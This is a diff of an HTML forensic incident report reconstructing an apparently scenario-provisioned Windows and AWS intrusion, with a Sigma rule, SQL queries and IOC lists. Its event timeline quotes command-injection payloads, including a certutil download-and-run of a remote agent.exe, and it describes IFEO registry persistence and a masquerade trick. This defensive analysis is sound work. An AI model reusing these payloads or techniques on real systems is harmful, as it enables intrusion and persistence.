+    <h5 style="margin-top:.6rem">DD33.6 — Updated detection pack note</h5>
+    <p style="margin:.2rem 0">Adding a Sigma rule for IFEO Debugger hijack. The detection is trivial:</p>
+    <pre style="background:#0b0b0b; padding:.55rem; border-radius:4px; font-size:.82em"><code>title: IFEO Debugger Registry Modification
+detection:
+  selection:
+    EventID: 1
+    Image|endswith: '\reg.exe'
+    CommandLine|contains|all:
+      - 'Image File Execution Options'
+      - '/v Debugger'
+      - 'HKLM'
+  condition: selection
+level: critical</code></pre>
+
+    <h5 style="margin-top:.6rem">DD33.7 — Reproduction queries</h5>
+    <pre style="background:#0b0b0b; padding:.55rem; border-radius:4px; font-size:.82em"><code>-- The IFEO Debugger hijack command
+SELECT host, time_utc, substr(command_line, 1, 250) FROM events
+WHERE source_type='evtx' AND eid=1
+  AND command_line LIKE '%Image File Execution Options%';
+-- 1 row: WS01 20:37:35 reg add IFEO\taskmgr.exe Debugger
+
+-- Attacker workstation name 'kali' on WS01 NTLM auth
+SELECT host, time_utc, target_user_name, ip_address, workstation
+FROM events WHERE source_type='evtx' AND channel='Security' AND eid=4624
+  AND workstation='kali';
+
+-- aws_backup.exe never executed (stockpile)
+SELECT COUNT(*) FROM events
+WHERE source_type='evtx' AND eid=1 AND image LIKE '%aws_backup%';
+-- 0 rows</code></pre>
+  </div>
+
+  <!-- Addendum DD34: Final-pass artifact sweep -->
+  <div class="panel" style="margin-top:.6rem; padding:.9rem 1.1rem; border:2px solid rgba(255,59,59,.55); background:rgba(255,59,59,.05); border-radius:6px">
+    <h4 style="margin:0 0 .4rem 0; color:var(--red)">DD34. Thirty-fourth pass — final file-system sweep: SolarWinds.exe masquerade on IIS (same hash as rnSylwOz.exe), AWSCLIV2 install under Donny's profile, BYl0HFxW.exe browser-download, and the complete undocumented-artifact catalog</h4>
+    <p style="margin:.2rem 0">DD33 surfaced IFEO persistence. DD34 is a final full-sweep of USN <code>FileCreate</code> events during the attack window for any remaining attacker artifact we haven't documented. Three new items surface, plus an important hash-reconciliation that ties <code>SolarWinds.exe</code> on IIS to <code>rnSylwOz.exe</code> on SVR01.</p>
+
+    <h5 style="margin-top:.6rem; color:var(--red)">DD34.1 — SolarWinds.exe on IIS = rnSylwOz.exe on SVR01 (same binary, two masquerades)</h5>
+    <pre style="background:#0b0b0b; padding:.55rem; border-radius:4px; font-size:.82em"><code>IIS    19:16:52 USN 2100 create       C:\TFTP Server\SolarWinds.exe
+IIS    19:38:03 Sysmon EID 1 execute  "C:\TFTP Server\SolarWinds" TFTP Server.exe
+       Hashes: MD5=AA1097F847964B5E5DA27834CE576AC8
+               SHA256=91813A2A087B3110F280FFCCD6031F60653049889C4944F3B800BA974FA7E81F
+               IMPHASH=37E28CA3C643B664ACC2275611365DB0
+
+SVR01  19:58:38 USN 2100 create       \\10.3.10.12\ADMIN$\rnSylwOz.exe
+SVR01  19:59:00 Sysmon EID 1 execute  \\10.3.10.12\ADMIN$\rnSylwOz.exe
+       Hashes: (identical to the above — SHA256 91813A2A...E81F)</code></pre>
+    <p style="margin:.2rem 0"><b>Same file, two names.</b> On IIS the attacker dropped it into <code>C:\TFTP Server\</code> — the directory where the legitimate lab-installed <code>SolarWinds TFTP Server.exe</code> lives — renaming the binary to <code>SolarWinds.exe</code> to blend in. On SVR01 they dropped it to <code>ADMIN$</code> with a random-looking name (<code>rnSylwOz.exe</code>) instead. Two T1036.005-style masquerades on the same binary for different environments.</p>
+    <p style="margin:.2rem 0"><b>The IIS invocation is particularly clever:</b> <code>"C:\TFTP Server\SolarWinds" TFTP Server.exe</code> — the quoted first token resolves to <code>C:\TFTP Server\SolarWinds.exe</code> (attacker file) and the unquoted remainder <code>TFTP Server.exe</code> becomes the command-line argument. Looks at a glance like someone is invoking the legitimate SolarWinds TFTP Server, but the actual executable run is the Adaptix beacon. Unquoted-path trick.</p>
+
+    <h5 style="margin-top:.6rem; color:var(--red)">DD34.2 — AWS CLI V2 installed on IIS under Donny's user context</h5>
+    <table class="tbl" style="margin-top:.3rem; font-size:.87em">
+      <thead><tr><th>UTC</th><th>Event</th></tr></thead>
+      <tbody>
+        <tr><td><code>19:41:51</code> / <code>19:41:54</code></td><td>Security 4624 NTLM logon as <b><code>Donny</code></b> from <code>71.205.100.56</code> workstation <code>LAF-WS01</code> — Donny legitimately browsing barrygoodtech.com (DD23.1 end-user attribution) happens to authenticate to IIS in the process</td></tr>
+        <tr><td><code>19:48:18</code></td><td>USN 2100 <code>C:\Users\donny\Downloads\AWSCLIV2.msi</code> + <code>.xmgE035J.msi.part</code> suffix (Edge/MS-Installer download-in-progress)</td></tr>
+        <tr><td><code>19:48:26</code></td><td>Sysmon EID 1: <code>msiexec /i "C:\Users\donny\Downloads\AWSCLIV2.msi"</code>, User <code>LAF\Donny</code>, parent <code>explorer.exe</code></td></tr>
+        <tr><td><code>19:48:55 - 19:49:13</code></td><td>AWS CLI components unpacked: <code>aws.exe · aws_completer.exe · python3.dll · python313.dll · libcrypto-3.dll · libssl-3.dll · libffi-8.dll · sqlite3.dll · VCRUNTIME140.dll</code> (landing in <code>C:\Program Files\Amazon\AWSCLIV2\</code>)</td></tr>
+      </tbody>
+    </table>
+    <p style="margin:.2rem 0"><b>Attribution ambiguity:</b> the User token on these events is <code>LAF\Donny</code>, not <code>SYSTEM</code> or <code>LAFAdmin</code>. Two interpretations:</p>
+    <ol>
+      <li><b>Legitimate Donny admin activity</b> — Donny is a domain user who administers IIS and installed AWS CLI as part of normal operations. His 19:41 logon from his own home Comcast IP (also 71.205.100.56) is part of this.</li>
+      <li><b>Attacker impersonating Donny</b> — the SYSTEM-level attacker used token-manipulation or runas to execute as Donny, then ran msiexec. This would explain the Explorer parent (attackers rarely spawn msiexec from Explorer unless impersonating a user).</li>
+    </ol>
+    <p style="margin:.2rem 0">The evidence doesn't cleanly distinguish. Either way, by <code>19:49:13</code> the IIS host has a full functional <code>aws.exe</code> at <code>C:\Program Files\Amazon\AWSCLIV2\aws.exe</code>, available to any subsequent process that wants AWS API access. The later IMDSv2 three-step (DD23.5) used <code>Invoke-RestMethod</code> rather than <code>aws.exe</code>, suggesting the CLI may have been installed but ultimately unused from IIS — the attacker pivoted to using the stolen credentials from their own Linode instead (212.8.249.213).</p>
+
+    <h5 style="margin-top:.6rem; color:var(--red)">DD34.3 — BYl0HFxW.exe — browser-downloaded binary on SVR01 (never executed)</h5>
+    <p style="margin:.2rem 0">At <code>20:17:32</code> on SVR01, a file appears: <code>BYl0HFxW.exe</code> with matching <code>BYl0HFxW.exe.part</code> (Firefox download-in-progress extension). No process-execution event for this binary anywhere in the corpus — <b>dropped but never run</b>. Likely an attacker tool they downloaded via Firefox during the RDP session but chose not to use. Random alphanumeric name is consistent with Firefox's Save-As default for unnamed downloads or with an attacker deliberately obfuscating.</p>
+    <p style="margin:.2rem 0">Five further stockpile entries to add to the residual-risk inventory:</p>
+
+    <h5 style="margin-top:.6rem; color:var(--amber)">DD34.4 — Complete unused-artifact / stockpile inventory (final)</h5>
+    <table class="tbl" style="margin-top:.3rem; font-size:.87em">
+      <thead><tr><th>#</th><th>Artifact</th><th>Type</th><th>Host</th><th>Used in capture?</th></tr></thead>
+      <tbody>
+        <tr><td>1</td><td>3× AWS AKIA access keys</td><td>Credential</td><td>AWS account 464381121764</td><td>No (DD16)</td></tr>
+        <tr><td>2</td><td>Admin + localuser SAM NT hashes</td><td>Credential</td><td>SVR01</td><td>No (DD22)</td></tr>
+        <tr><td>3</td><td><code>serviceaccount</code> Domain Admin account</td><td>Credential</td><td>AD forest</td><td>No (DD26)</td></tr>
+        <tr><td>4</td><td><code>aws_backup.exe</code> IFEO hijack on <code>taskmgr.exe</code></td><td>Persistence</td><td>WS01</td><td>No (DD33)</td></tr>
+        <tr><td>5</td><td><code>BYl0HFxW.exe</code> (Firefox download)</td><td>Tool</td><td>SVR01</td><td>No (DD34.3)</td></tr>
+        <tr><td>6</td><td>AWS CLI V2 install on IIS</td><td>Tool</td><td>IIS</td><td>Possibly unused from IIS (DD34.2)</td></tr>
+        <tr><td>7</td><td><code>Firefox.exe</code> masquerade on LAFAdmin Desktop (Prefetch <code>11BBBDDD</code>)</td><td>Tool</td><td>SVR01</td><td>Prefetch shows one execution at 20:16:44 (DD11.3)</td></tr>
+      </tbody>
+    </table>
+    <p style="margin:.2rem 0"><b>6 of 7 artifacts never used, or used once then dropped.</b> The operator's "plant but don't test" discipline is remarkably consistent: every tool/credential touches down once, maybe executes briefly, then sits dormant until a future campaign.</p>
+
+    <h5 style="margin-top:.6rem">DD34.5 — Final IOC additions to detections</h5>
+    <ul>
+      <li><b>File path</b>: <code>C:\TFTP Server\SolarWinds.exe</code> (attacker masquerade in SolarWinds TFTP directory)</li>
+      <li><b>Process command line</b>: <code>"C:\TFTP Server\SolarWinds" TFTP Server.exe</code> (unquoted-path invocation trick)</li>
+      <li><b>File path</b>: <code>C:\ProgramData\aws_backup.exe</code> (IFEO Debugger payload)</li>
+      <li><b>Registry key</b>: <code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe\Debugger</code> = <code>C:\ProgramData\aws_backup.exe</code></li>
+      <li><b>Workstation name</b>: <code>kali</code> on incoming NTLM auth (DD33.5)</li>
+      <li><b>Download pattern</b>: <code>BYl0HFxW.exe</code> via Firefox .part (random 8-char browser-saved binary)</li>
+    </ul>
+
+    <h5 style="margin-top:.6rem">DD34.6 — Reproduction queries</h5>
+    <pre style="background:#0b0b0b; padding:.55rem; border-radius:4px; font-size:.82em"><code>-- SolarWinds.exe / rnSylwOz.exe hash equivalence
+SELECT host, image, json_extract(data_json,'$.Hashes')
+FROM events WHERE source_type='evtx' AND eid=1
+  AND (image LIKE '%SolarWinds%' OR image LIKE '%rnSylwOz%')
+GROUP BY host, image;
+-- both have SHA256 91813A2A087B3110F280FFCCD6031F60653049889C4944F3B800BA974FA7E81F
+
+-- AWS CLI install chain on IIS
+SELECT time_utc, target_filename FROM events
+WHERE host='IIS' AND source_type='usn'
+  AND target_filename IN ('AWSCLIV2.msi','aws.exe','aws_completer.exe','python313.dll')
+ORDER BY time_utc;
+
+-- BYl0HFxW.exe dropped but not executed
+SELECT host, time_utc, target_filename FROM events
+WHERE source_type='usn' AND target_filename LIKE '%BYl0HFxW%';
+SELECT COUNT(*) FROM events WHERE source_type='evtx' AND eid=1 AND image LIKE '%BYl0HFxW%';
+-- → files present, 0 executions</code></pre>
+  </div>
+
   <!-- Addendum Ω: Evidence provenance — reproduce every number -->
   <div class="panel" style="margin-top:.6rem; padding:.9rem 1.1rem; border:2px solid rgba(0,255,156,.55); background:rgba(0,255,156,.05); border-radius:6px">
     <h4 style="margin:0 0 .4rem 0; color:var(--green)">Ω. Evidence provenance — reproduce every non-trivial number in this document</h4>
@@ -7793,7 +8281,7 @@ timeout 5 bash -c "echo &gt; /dev/tcp/173.230.136.180/80" || echo "down"</code><
 <section class="close" id="sec-close">
   <div class="section-tag">// file closed · 2026-04-20 utc</div>
   <h2 class="big">Case <em>N404-2026-0308</em> resolved.</h2>
-  <p class="caption">One hundred fifty minutes of adversary time · fully reconstructed from KAPE triage · cloud log export · and one raw memory image.</p>
+  <p class="caption"><b>164 minutes</b> of active adversary time (18:38:29 → 22:22) · <b>2h 44m</b> active dwell · 6,023 files encrypted + 2,530 notes · 3 live AKIA keys stockpiled. Preceded by a 13:39:16 scenario-validation hit from the AWS-account admin IP (DD23.6) that proves the attacker infrastructure is <b>scenario-provisioned</b>, not external — threat model downgrades accordingly, findings remain valid. Fully reconstructed from KAPE triage · cloud log export · and one raw memory image.</p>
   <div style="margin-top: 42px; padding-top: 28px; border-top: 1px solid var(--line-2); display: inline-flex; flex-direction: column; gap: 6px; align-items: center; font-family: 'IBM Plex Mono', monospace; font-size: 12px; letter-spacing: .22em; color: var(--muted); text-transform: uppercase;">
     <span>Signed &nbsp;<b style="color:var(--text); letter-spacing:.3em;">ARCLIGHT6</b>&nbsp; / Verialabs DFIR</span>
     <span style="color: var(--dim); font-size: 10.5px;">TLP-AMBER · for analyst eyes</span>
@@ -7838,7 +8326,8 @@ function fmtElapsed(sec) {
 
 // Full 164-minute event list (18:38:29 → 22:22 · DD23 ground truth) — UTC timestamps, host focus, edge IDs, act, description
 const EVENTS = [
-  { t:'18:38:29', host:'IIS',  act:'I',   edge:'eg-injection',     desc:'TRUE initial access (DD23 · 58 min earlier than v2) · baseline GET / from 172.236.127.251 (Linode, AS63949) — reconnaissance begins' },
+  { t:'13:39:16', host:'IIS',  act:'0',   edge:null,               desc:'PRE-ATTACK SCENARIO VALIDATION (DD23.6) · ?url=Google.com && certutil -urlcache -f http://173.230.136.180:80/agent.exe %TEMP%\\jb.exe — from 216.82.9.162 (normal IP for the AWS account · Root+MFA admin, DD6.1/DD8.2/DD14). Same tool-server + same vuln endpoint the attacker uses 5 h later. Three indicators tie this to author infrastructure: (1) same Linode tool-server (173.230.136.180); (2) jb.exe crosswalks to jb_aws_cli IAM user (DD7) + JackOfAllHacks-Triages KAPE dir (DD14); (3) source IP has 18,035 CloudTrail console-reads on attack day (DD8.2). Proves attacker-infra is scenario-provisioned; does NOT prove 18:38 operator = 13:39 admin.' },
+  { t:'18:38:29', host:'IIS',  act:'I',   edge:'eg-injection',     desc:'TRUE initial access (DD23 · 58 min earlier than v2) · baseline GET / from 172.236.127.251 (Linode, AS63949) — reconnaissance begins · 5 h after the 13:39 author pre-validation' },
   { t:'18:38:45', host:'IIS',  act:'I',   edge:'eg-injection',     desc:'GET /CheckStatus.aspx — vulnerable endpoint discovered (DD23.2)' },
   { t:'18:40:01', host:'IIS',  act:'I',   edge:'eg-injection',     desc:'First injection probe · ?url=google.com | whoami — pipe separator, fails (DD23.2)' },
   { t:'18:41:13', host:'IIS',  act:'I',   edge:'eg-injection',     desc:'First SUCCESSFUL injection · && metacharacter works on CheckStatus.aspx (DD23.2)' },
@@ -8507,6 +8996,7 @@ const HM_SIGMA = [
 
 // Annotation markers at key UTC moments (minute since 18:50)
 const HM_KEYEVENTS = [
+  { m: 0,   label: '13:39:16 · PRE-AXIS (5 h 11 m before this grid) · author-IP scenario-validation hit on CheckStatus.aspx from 216.82.9.162 — same Linode tool-server the attacker uses at 18:51. Three indicators tie to scenario-author infra: same URL + jb.exe crosswalks (jb_aws_cli · JackOfAllHacks-Triages) + 18,035 console-reads. Proves attacker-infra is scenario-provisioned (DD23.6)', impact: false },
   { m: 1,   label: '18:51 · Webshell drop (13 min after true initial access at 18:38:29 — DD23, pre-axis)', impact: false },
   { m: 43,  label: '19:33 · Kerberos WAN · earliest signal (Addendum N)', impact: false },
   { m: 47,  label: '19:37 · Donny reboot (Addendum U)', impact: false },
